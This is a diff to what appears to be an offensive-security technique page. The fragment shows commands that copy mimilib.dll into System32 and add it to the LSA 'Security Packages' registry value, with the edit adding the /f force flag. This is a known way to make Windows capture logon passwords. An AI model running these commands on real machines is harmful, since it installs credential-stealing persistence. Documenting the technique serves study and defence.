@@ -38,7 +38,7 @@ copy C:\Windows\Temp\mimilib.dll C:\Windows\System32\mimilib.dll
 Then, edit LSA registry keys to include the new security support provider
 
 ```powershell
-reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
+reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
 ```
 {% endtab %}
 
